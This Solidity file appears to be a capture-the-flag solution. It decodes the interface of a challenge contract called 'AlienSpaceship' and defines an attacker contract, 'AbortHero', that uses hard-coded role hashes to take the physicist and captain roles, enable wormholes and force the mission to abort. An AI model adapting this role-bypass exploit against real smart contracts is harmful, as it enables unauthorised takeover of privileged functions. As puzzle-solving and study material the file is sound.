// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface AlienSpaceship {
    function missionAborted() external view returns (bool);

    // Decoded function signatures

    // VIEW
    function roles(address) external view returns (uint256, uint256, bool);
    function payloadMass() external view returns (uint256);
    function position() external view returns (uint256, uint256, uint256);
    function distance() external view returns (uint256);
    function numArea51Visits() external view returns (uint256);
    function wormholesEnabled() external view returns (bool);

    // MODIFIERS
    function applyForJob(bytes32) external;
    function applyForPromotion(bytes32) external;
    function runExperiment(bytes calldata) external;
    function quitJob() external;
    function visitArea51(address) external;
    function dumpPayload(uint256) external;
    function enableWormholes() external;
    function jumpThroughWormhole(int256, int256, int256) external;
    function abortMission() external;
}

contract AbortHero {
    AlienSpaceship private alienSpaceship;
    bytes private constant PHYSICIST = abi.encode(0xb5b6b705a01c9fbc2f5b52325436afd32f5988596d999716ad1711063539b564);
    bytes private constant CAPTAIN = abi.encode(0x3a1665efe60dbe93a7cdcf728baddc0d7ebafe407d444d0de3ed20e1e52a6a0d);

    constructor(address _alienSpaceship) {
        alienSpaceship = AlienSpaceship(_alienSpaceship);
        alienSpaceship.applyForJob(bytes32(PHYSICIST));
        alienSpaceship.enableWormholes();
    }

    function abortMission() external {
        alienSpaceship.applyForPromotion(bytes32(CAPTAIN));
        alienSpaceship.abortMission();
    }
}
